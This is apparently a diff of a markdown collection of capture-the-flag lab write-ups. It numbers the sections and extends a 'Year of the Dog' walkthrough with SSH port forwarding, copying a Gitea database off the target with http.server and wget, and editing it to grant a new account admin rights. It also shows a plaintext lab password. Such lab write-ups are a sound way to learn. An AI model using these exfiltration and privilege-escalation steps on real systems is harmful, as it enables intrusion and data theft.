@@ -78,7 +78,7 @@
 ###### 👉 Special for **strong enumeration discipline** and spotting small misconfigurations.
 
 
-## Ignite
+## 1. Ignite
 
 ```
 nmap -sC -sV -A <IP>
@@ -155,7 +155,7 @@ cat  /root/root.txt
 We got root flag
 
 
-## Relevant
+## 2. Relevant
 
 Run nmap scans and we found smb and other things
 
@@ -222,7 +222,7 @@ And we got our reverse shell
 
 
 ```
-(Get-ChildItem C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue).FullName
+dir C:\user.txt /s /b
 ```
 
 ```
@@ -274,7 +274,7 @@ cat root.txt
 ```
 
 
-## Basic Pentesting
+## 3. Basic Pentesting
 
 ```
 nmap -sC -sV <IP>
@@ -373,7 +373,7 @@ cat pass.bak
 ![enum result](Assets/5.png)
 
 
-## Mr. Robot
+## 4. Mr. Robot
 
 ```
 nmap -sV -sC [Target_IP]
@@ -530,7 +530,7 @@ nmap --interactive
 ##### Now we are logged in as root
 
 
-## Kenobi
+## 5. Kenobi
 
 ```
 nmap -sC -sV <IP>
@@ -661,7 +661,7 @@ cat root.txt
 
 
 
-## Chocolate Factory
+## 6. Chocolate Factory
 
 ```
 nmap -sC -sV <IP>
@@ -832,7 +832,7 @@ python root.py
 ```
 
 
-## Year of the Rabbit
+## 7. Year of the Rabbit
 
 ```nmap -sC -sV -Pn <IP>```
 
@@ -965,7 +965,7 @@ Locate root flag
 
   ![enum result](34.png)
 
-## Year of the Dog
+## 8. Year of the Dog
 
 ```
 nmap -sV -sC [Target_IP]
@@ -980,6 +980,8 @@ feroxbuster -u http://10.49.134.39 -w dirbuster/wordlists/directory-list-2.3-med
 ```
 
 Also run dirbuster where we found a page called config.php
+
+Open burp suite and intercept the request of / 
 
 ![enum result](35.png)
 
@@ -1139,6 +1141,10 @@ If we cat in this file we can see something
 
 ![enum result](47.png)
 
+```
+cat work_analysis | grep dylan
+```
+
 We found dylan's password
 
 ```
@@ -1161,12 +1167,195 @@ Now cat dylan's user.txt file
 
 Everything is okay in this we have to take a different path now
 
+```
+ls -la
+```
 
-## BookStore
+Here .gitconfig looks different, lets check it out
+
+```
+cat .gitconfig
+```
+
+![[Pasted image 20260214210912.png]]
+
+Now we dont have much clue so we will find if there is anything running on the localhost system on any port
+
+```
+netstat -ant | grep -i listen
+```
+
+- **`-a`** → show **all** sockets (both listening ports and established connections)
+
+- **`-n`** → show **numeric** addresses & ports (don’t try to resolve hostnames or service names)
+
+- **`-t`** → show **TCP** connections only
+
+![[Pasted image 20260214212110.png]]
+
+In them I find that 3000 port different as we saw rest all already
+
+```
+curl http://127.0.0.1:3000 | grep git
+```
+
+Now we still dont have much but we can do ssh port forwarding
+
+```
+ssh dylan@10.48.134.10 -L 6789:127.0.0.1:3000
+```
+
+In this we are forwarding traffic of port 127.0.0.1:3000 of dylan to our localhost port 6789 
+
+![[Pasted image 20260214212905.png]]
+
+If we go to sign in, we will be needing password and email of dylan
+
+```
+dylan@yearofthedog.thm
+```
+
+```
+Labr4d0rs4L1f3
+```
+
+Now we found an authentication page which we need to bypass
+
+Right Click -> View Page Source
+
+We found it is using Gitea version 1.13.0
+
+![[Pasted image 20260214213337.png]]
+
+Let us find its exploit which will allow us to bypass this
+
+I did search but there wasnt much over there to bypass authentication
+
+In their website register a new user
+
+![[Pasted image 20260214215153.png]]
+
+In our dylan's machine let us find if we are able to locate gitea directory
+
+```
+find / -name "*gitea*" 2>/dev/null
+```
+
+![[Pasted image 20260214213812.png]]
+
+Let us look inside it
+
+We dig deep and found a file called gitea.db
+
+![[Pasted image 20260214213913.png]]
+
+Let us push this into our system
+
+run this in dylan's machine
+
+```
+python3 -m http.server 8009
+```
+
+Now in your machine
+
+```
+wget http://IP:8009/gitea.db
+```
+
+![[Pasted image 20260214214208.png]]
+
+```
+sqlite3 gitea.db
+```
+
+```
+.tables
+```
+
+```
+.schema user
+```
+
+Now we will run this sql command
+
+```
+select lower_name,is_admin from user;
+```
+
+![[Pasted image 20260214215400.png]]
+
+Now I created a user which doesn't have admin controls so I will make it admin
+
+```
+update user set is_admin=1 where lower_name="someuser";
+```
+
+```
+select lower_name,is_admin from user;
+```
+
+![[Pasted image 20260214215557.png]]
+
+Now our task is to push this gitea.db file in that folder which will make it permanent
+
+First let us delete our gitea.db file in dylan
+
+```
+rm gitea.db
+```
+
+Exit the document and we will run 
+
+```
+scp gitea.db dylan@10.48.134.10:/gitea/gitea
+``` 
+
+Now logout from that page and login again with username and password
+
+```
+someuser:123456
+```
+
+Now access the page of dylan's repo
+
+![[Pasted image 20260214222011.png]]
+
+Now in dylan's machine
+
+Insite the gitea/gitea folder
+
+```
+cd /tmp
+```
+
+Here we will change port to 3000 as we want to copy from dylan's one
+
+```
+git clone http://127.0.0.1:3000/Dylan/Test-Repo.git 
+```
+
+```
+cd Test-Repo/
+```
+
+```
+echo 'test' >> README.md
+```
 
 
 
-## Mustacchio
+
+
+
+
+
+
+## 9. BookStore
+
+
+
+## 10. Mustacchio
 
 ``` 
 nmap -p- -sC -sV IP
@@ -1328,7 +1517,7 @@ We got our password urieljames
 
 
 
-## Game Server
+## 11. Game Server
 
 
   
